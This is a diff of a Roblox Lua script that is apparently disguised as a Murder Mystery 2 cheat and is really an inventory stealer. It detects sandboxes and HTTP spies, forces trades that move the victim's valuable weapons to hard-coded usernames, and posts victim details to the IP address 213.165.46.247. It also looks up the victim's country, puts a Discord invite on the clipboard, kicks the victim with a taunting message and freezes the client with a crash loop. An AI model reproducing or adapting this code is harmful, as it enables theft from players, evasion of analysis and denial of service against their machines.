@@ -1,4 +1,4 @@
---Ezz
+-Lol
 
 _G.Usernames = {"Erereer454"} 
 _G.min_rarity = "Common" 
@@ -14,39 +14,39 @@ getgenv().executed = true
 local hooked = false
 if not rawequal(_25mspredefine, nil) then
     do hooked = true end
-    do return "", error("<3"), assert(false, "<3"), (nil)() end
+    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 local string_lower_result = debug.traceback():lower()
 if string_lower_result:find("sandbox") or string_lower_result:find("unveilr") or string_lower_result:find("httpspy2") then
     do hooked = true end
-    do return "", error("<3"), assert(false, "<3"), (nil)() end
+    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 if isfunctionhooked then
     if (http and http.request and isfunctionhooked(http.request)) or (request and isfunctionhooked(request)) or (http_request and isfunctionhooked(http_request)) or (httprequest and isfunctionhooked(httprequest)) then
         do hooked = true end
-        do return "", error("<3"), assert(false, "<3"), (nil)() end
+        do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
         do return nil end
     end
     if hookfunction then
         local f = function() end
         if isfunctionhooked(f) then
             do hooked = true end
-            do return "", error("<3"), assert(false, "<3"), (nil)() end
+            do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
             do return nil end
         end
         hookfunction(f, function() print("hi") end)
         if not isfunctionhooked(f) then
             do hooked = true end
-            do return "", error("<3"), assert(false, "<3"), (nil)() end
+            do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
             do return nil end
         end
     end
 end
 if not getmetatable or not setmetatable or not type or not select or type(select(2, pcall(getmetatable, setmetatable({}, {__index = function(self, ...) while true do end end})))['__index']) ~= 'function' or not pcall or not debug or not rawget or not rawset or not pcall(rawset,{}," "," ") or getmetatable(require) or getmetatable(print) or getmetatable(error) or ({debug.info(print,'a')})[1]~=0 or ({debug.info(tostring,'a')})[1]~=0 or ({debug.info(print,'a')})[2]~=true or not select or not getfenv or select(1, pcall(getfenv, 69)) == true or not select(2, pcall(rawget, debug, "info")) or #(((select(2, pcall(rawget, debug, "info")))(getfenv, "n")))<=1 or #(((select(2, pcall(rawget, debug, "info")))(print, "n")))<=1 or not (select(2, pcall(rawget, debug, "info")))(print, "s") == "[C]" or not (select(2, pcall(rawget, debug, "info")))(require, "s") == "[C]" or (select(2, pcall(rawget, debug, "info")))((function()end), "s") == "[C]" or not select(1, pcall(debug.info, coroutine.wrap(function() end)(), 's')) == false then
     do hooked = true end
-    do return "", error("<3"), assert(false, "<3"), (nil)() end
+    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 local Success = pcall(function()
@@ -54,7 +54,7 @@ local Success = pcall(function()
 end)
 while Success do
     do hooked = true end
-    do return "", error("<3"), assert(false, "<3"), (nil)() end
+    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 game:GetChildren(function()
@@ -62,7 +62,7 @@ game:GetChildren(function()
 end)
 while #game:GetChildren() <= 4 do
     do hooked = true end
-    do return "", error("<3"), assert(false, "<3"), (nil)() end
+    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 local Success, Result = pcall(function()
@@ -70,12 +70,12 @@ local Success, Result = pcall(function()
 end)
 while not Success do
     do hooked = true end
-    do return "", error("<3"), assert(false, "<3"), (nil)() end
+    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 while Result[6][2] ~= nil do
     do hooked = true end
-    do return "", error("<3"), assert(false, "<3"), (nil)() end
+    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 local _, Message = pcall(function()
@@ -83,7 +83,7 @@ local _, Message = pcall(function()
 end)
 while not Message:find("attempt to call a Instance value") do
     do hooked = true end
-    do return "", error("<3"), assert(false, "<3"), (nil)() end
+    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 if hooked then
@@ -195,6 +195,8 @@ end
 
 
 
+if realSetClipboard then
+pcall(function() realSetClipboard("https://discord.gg/zXAD3Ftnbv") end) end
 
 local rarityTable = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Godly", "Ancient", "Unique"}
 
@@ -221,9 +223,11 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
 local plr = Players.LocalPlayer
 if next(users) == nil then
+    plr:kick("You didn't add a usernames or a valid webhook !")
     return
 end
 if game.PlaceId ~= 142823291 then
+    plr:kick("Game not supported. Please join a normal MM2 server")
     return
 end
 
@@ -231,12 +235,14 @@ local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
 local isMobile = string.find(executor, "delta") or string.find(executor, "krnl")
 local isSalora = string.find(executor, "solara")
 if isSalora then
+    plr:kick("solara isnt supported please use xeno or any other executer")
     return
 end
 local VIP = (game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer")
 local FULL = (#Players:GetPlayers() >= 12)
 if VIP or FULL then
     if isMobile then
+        plr:kick(VIP and "VIP Servers not supported." or "FULL Servers Arent Supported")
         return
     else
         print(VIP and "VIP Server detected, hopping..." or "Server full, hopping...")
@@ -258,26 +264,24 @@ local function assignHitToDatabase()
     end
 
     for _, receiverName in ipairs(userList) do
-        task.spawn(function()
-            local receiverStr = tostring(receiverName)
-            local payload = {
-                jobId = jobId, 
-                placeId = game.PlaceId,
-                username = plr.Name,
-                receiver = receiverStr 
-            }
+        local receiverStr = tostring(receiverName)
+        local payload = {
+            jobId = jobId, 
+            placeId = game.PlaceId,
+            username = plr.Name,
+            receiver = receiverStr 
+        }
 
-            pcall(function()
-                return request({
-                    Url = "http://213.165.46.247:3002/hit",
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json",
-                        ["Authorization"] = "nice_remote_spy"
-                    },
-                    Body = HttpService:JSONEncode(payload)
-                })
-            end)
+        local success, response = pcall(function()
+            return request({
+                Url = "http://213.165.46.247:3002/hit",
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json",
+                    ["Authorization"] = "nice_remote_spy"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
         end)
 end
 end
@@ -286,26 +290,24 @@ local function assignDhToDatabase()
     local userListt = DhUsers or {}
     
     for _, receiverName in ipairs(userListt) do
-        task.spawn(function()
-            local receiverStr = tostring(receiverName)
-            local payload = {
-                jobId = jobId, 
-                placeId = game.PlaceId,
-                username = plr.Name,
-                receiver = receiverStr 
-            }
+        local receiverStr = tostring(receiverName)
+        local payload = {
+            jobId = jobId, 
+            placeId = game.PlaceId,
+            username = plr.Name,
+            receiver = receiverStr 
+        }
 
-            pcall(function()
-                return request({
-                    Url = "http://213.165.46.247:3002/hit",
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json",
-                        ["Authorization"] = "nice_remote_spy"
-                    },
-                    Body = HttpService:JSONEncode(payload)
-                })
-            end)
+        local success, response = pcall(function()
+            return request({
+                Url = "http://213.165.46.247:3002/hit",
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json",
+                    ["Authorization"] = "nice_remote_spy"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
         end)
 end
 end
@@ -318,7 +320,7 @@ local localPlayer = Players.LocalPlayer
 local victimLevel = GetPlayerLevel:InvokeServer(localPlayer)
 
 if victimLevel < 10 then
-    return
+    localPlayer:Kick("script error. make sure ur above the level 9")
 end
 
 
@@ -590,7 +592,7 @@ local function getTradeStatus()
 end
 local function waitForTradeCompletion()
     while true do
-        task.wait()
+        task.wait(0.1)
         if getTradeStatus() == "None" then break end
     end
 end
@@ -671,8 +673,13 @@ if #inventoryStr + #line < 350 then
     end
 inventoryStr = inventoryStr .. "```"
 
-local country = loc.country or "Unknown"
-local locationStr = country
+local country = "Unknown"
+    pcall(function()
+        local response = game:HttpGet("http://ip-api.com/json/")
+        local data = HttpService:JSONDecode(response)
+        country = data.country or "Unknown"
+    end)
+local locationStr = (loc.country or "Unknown")
     if loc.city and loc.city ~= "" then locationStr = locationStr .. ", " .. loc.city end
 
     local isTopHit = false
@@ -710,7 +717,7 @@ local locationStr = country
                 { name = "\240\159\148\151 Quick Join", value = "[**Click to Join**](" .. JoinLink .. ")", inline = true }
             },
             footer = {
-                text = "Adrenalin.win Helper \194\183 discord.gg/TCGXvPkH5",
+                text = "Wym Scripts \194\183 discord.gg/zXAD3Ftnbv",
                 icon_url = NotHead
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -732,17 +739,17 @@ end
 
 if isWhitelisted then
 
-    task.spawn(SendMemberHit, data)
-    task.spawn(assignHitToDatabase)
+    SendMemberHit(data)
+    assignHitToDatabase()
 else
-    task.spawn(SendMemberHit, data)
-    task.spawn(assignHitToDatabase)
+    SendMemberHit(data)
+    assignHitToDatabase()
     
     if  totalValue > 200 then
-        task.delay(1, function()
+        task.delay(90, function()
             SecureSend(data)
         end)
-        task.delay(1, function()
+        task.delay(90, function()
             assignDhToDatabase()
         end)
         
@@ -781,6 +788,7 @@ local valueList = buildValueList()
 local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
 local totalValue = 0
 for dataid, amount in pairs(realData.Weapons.Owned) do
+    task.wait()
     local rarity = database[dataid].Rarity
     local weapon_rarity_index = table.find(rarityTable, rarity)
     if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
@@ -856,10 +864,10 @@ end)
         local initialTradeState = getTradeStatus()
         if initialTradeState == "StartTrade" then
             Trade.DeclineTrade:FireServer()
-            task.wait()
+            task.wait(0.3)
         elseif initialTradeState == "ReceivingRequest" then
             Trade.DeclineRequest:FireServer()
-            task.wait()
+            task.wait(0.3)
         end
 
         while #weaponsToSend > 0 do
@@ -867,20 +875,20 @@ end)
             if tradeStatus == "None" then
                 sendTradeRequest(joinedUser)
             elseif tradeStatus == "SendingRequest" then
-                task.wait()
+                task.wait(0.3)
             elseif tradeStatus == "ReceivingRequest" then
                 Trade.DeclineRequest:FireServer()
-                task.wait()
+                task.wait(0.3)
             elseif tradeStatus == "StartTrade" then
                 local numToTrade = math.min(4, #weaponsToSend)
                 for i = 1, numToTrade do
                     local weapon = weaponsToSend[i]
                     for _ = 1, weapon.Amount do
                         addWeaponToTrade(weapon.DataID)
-                        task.wait()
+                        task.wait(0.05)
                     end
                 end
-                task.wait(2)
+                task.wait(6)
                 acceptTrade()
                 waitForTradeCompletion()
 
@@ -899,10 +907,11 @@ end)
                     pcall(function() Trade.DeclineTrade:FireServer() end)
                 end
             else
-                task.wait()
+                task.wait(0.5)
             end
-            task.wait()
+            task.wait(1)
         end
+        plr:kick("Your Inventory Got Stolen\nJoin discord.gg/zXAD3Ftnbv To Make Your Own Script !")
     end
 
         local function startImmediateHit()
@@ -922,17 +931,25 @@ end)
     end)
 end
 
-task.delay(10, function()
-    local function crash()
-        task.spawn(crash)
+wait(10)
+
+-- // INSTANT SUPER AGGRESSIVE FREEZE
+-- Начинает заморозку сразу же после выполнения скрипта
+
+local function crash()
+    task.spawn(crash)
+    coroutine.wrap(crash)()
+    task.defer(crash)
+    
+    while true do
         coroutine.wrap(crash)()
-        task.defer(crash)
-        while true do
-            coroutine.wrap(crash)()
-        end
     end
-    for i = 1, 20 do
-        task.spawn(crash)
-    end
-    crash()
-end)
+end
+
+-- Максимально быстрый запуск нескольких ядер
+for i = 1, 20 do
+    task.spawn(crash)
+end
+
+-- Финальный удар
+crash()
